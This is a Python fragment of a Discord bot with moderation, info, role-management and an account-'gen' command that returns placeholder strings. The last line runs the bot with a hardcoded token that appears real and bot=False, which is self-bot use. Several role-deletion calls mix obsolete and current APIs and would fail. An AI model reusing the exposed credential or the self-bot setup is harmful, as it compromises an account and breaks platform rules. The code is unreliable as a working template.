async def gen(ctx):
   accs = [
       "acc here",
       "acc here",
       "acc here",
       "acc here",
       "acc here",
       "acc here"
   ]
 
   await ctx.send(f"{random.choice(accs)}")
@bot.command(pass_context = True)
async def mute(ctx, member: discord.Member):
   if ctx.message.author.id == 441212840410611722:
       role = get(member.guild.roles, name="Muted")
       await member.add_roles(role)
       embed=discord.Embed(title="User Muted!", description="**{0}** was muted by **{1}**!".format(member, ctx.message.author), color=0xff00f6)
       await ctx.send(embed=embed)
   else:
      embed=discord.Embed(title="Permission Denied.", description="You don't have permission to use this command.", color=0xff00f6)
      await ctx.send(embed=embed)
@bot.command(pass_context = True)
async def unmute(ctx, member: discord.Member):
   if ctx.message.author.id == 441212840410611722:
       role = get(member.guild.roles, name="Muted")
       await member.remove_roles(role)
       embed=discord.Embed(title="User UnMuted!", description="**{0}** was unmuted by **{1}**!".format(member, ctx.message.author), color=0xff00f6)
       await ctx.send(embed=embed)
   else:
      embed=discord.Embed(title="Permission Denied.", description="You don't have permission to use this command.", color=0xff00f6)
      await ctx.send(embed=embed)
 
@bot.command(pass_context=True)
async def uptime(ctx):
       current_time = time.time()
       difference = int(round(current_time - start_time))
       text = str(datetime.timedelta(seconds=difference))
       embed=discord.Embed(title="Uptime", description=text, color=ctx.message.author.top_role.colour)
       await ctx.send(embed=embed)
@bot.command()
async def info(ctx, user: discord.Member):
   if not user:
       user = ctx.message.author
   roles = [role.name.replace("@", "@") for role in user.roles]
   voice_channel = user.voice
   if voice_channel is not None:
       voice_channel = voice_channel.channel.name
   else:
       voice_channel = "Not in a voice channel."
   embed = discord.Embed(
       colour = discord.Colour.red()
   )
 
   embed.set_author(name=f"{user}'s info")
   embed.add_field(name="Name", value=user.name, inline=True)
   embed.add_field(name="ID", value=user.id, inline=True)
   embed.add_field(name="Status", value=user.status, inline=True)
   embed.add_field(name="Bot", value=user.bot, inline=True)
   embed.add_field(name="Voice channel", value=voice_channel, inline=True)
   embed.add_field(name="Joined", value=user.joined_at, inline=True)
   embed.add_field(name="Created", value=user.created_at, inline=True)
   embed.add_field(name="Highest role", value=user.top_role, inline=True)
   embed.add_field(name="Roles", value=roles, inline=True)
   embed.set_thumbnail(url=user.avatar_url)
   await ctx.send(embed=embed)
@bot.command()
async def avatar(ctx, user: discord.Member):
       if user is None:
           user = ctx.author
       embed = discord.Embed(title="Avatar",
                           color = discord.Color.blue())
       embed.set_image(url=user.avatar_url)
       await ctx.send(embed=embed)
@bot.command()
async def serverinfo(ctx):
       guild = ctx.guild
       person_count = len([member for member in guild.members if not member.bot])
       bot_count = len([member for member in guild.members if member.bot])
       msg = "ID: " + str(guild.id) + "\nCreated on: " + str(guild.created_at) + "\nRegion: " + str(guild.region) + "\nMember count: " + str(len(guild.members)) + "\nHumans: " + str(person_count) + "\nBots: " + str(bot_count) + "\nOwner: " + str(guild.owner) + "\n"
       embed = discord.Embed(description=msg,
                           color=discord.Color.green())
       embed.title = guild.name
       if guild.icon_url:
           embed.set_thumbnail(url=guild.icon_url)
       await ctx.send(embed=embed)
 
@bot.command()
async def botinfo(ctx):
   embed = discord.Embed(title="What this is for?", description="Just a little info about this bot", color=0xeee657)
   embed.add_field(name="Server count", value=f"{len(bot.guilds)}")
   embed.add_field(name="Invite link", value="http://bit.ly/LittleWh1teB0t")
   embed.add_field(name="Dev of this bot", value="The dev of this bot is LittleWh1te H4t")
   embed.add_field(name="Wanna know someone who is super important to LittleWh1te H4t?", value="Her name is dakaris she means everything to him")
   await ctx.send(embed=embed)
 
 
@bot.command(pass_context=True)
async def roles(ctx):
   await ctx.send("Making roles...")
   guild = ctx.guild
   await guild.create_role(name="Owner")
   await guild.create_role(name="Co-Owner")
   await guild.create_role(name="Developer")
   await guild.create_role(name="Head-Admin")
   await guild.create_role(name="Senior-Admin")
   await guild.create_role(name="Admin")
   await guild.create_role(name="Junior-Admin")
   await guild.create_role(name="Discord-Manager")
   await guild.create_role(name="Senior-Mod")
   await guild.create_role(name="Mod")
   await guild.create_role(name="Junior-Mod")
   await guild.create_role(name="Helper")
   await guild.create_role(name="Bots")
   await guild.create_role(name="Guest")
   await ctx.send("Done!")
   return
@bot.command(pass_context=True)
async def delrolestest(ctx):
   await ctx.send("Deleting roles...")
   guild = ctx.guild
   await guild.delete_role(name="Owner")
   await guild.delete_role(name="Co-Owner")
   await guild.delete_role(name="Developer")
   await guild.delete_role(name="Head-Admin")
   await guild.delete_role(name="Senior-Admin")
   await guild.delete_role(name="Admin")
   await guild.delete_role(name="Junior-Admin")
   await guild.delete_role(name="Discord-Manager")
   await guild.delete_role(name="Senior-Mod")
   await guild.delete_role(name="Mod")
   await guild.delete_role(name="Junior-Mod")
   await guild.delete_role(name="Helper")
   await guild.delete_role(name="Bots")
   await guild.delete_role(name="Guest")
   await ctx.send("Done!")
   return
@bot.command(pass_context=True)
async def delroletest(ctx, *,role_name):
 role = discord.utils.get(ctx.message.server.roles, name=role_name)
 if role:
   try:
     await ctx.guild.delete_role(ctx.message.server, role)
     await ctx.send("The role {} has been deleted!".format(role.name))
   except discord.Forbidden:
     await ctx.send("Missing Permissions to delete this role!")
 else:
   await ctx.send("The role doesn't exist!")
 
 
 
 
bot.run("NjM1MTkxMDQwNzY0MDE4NzE5.XbXLkA.fK94970N7rkgrrQ8fLLA7onc4bI", bot=False)
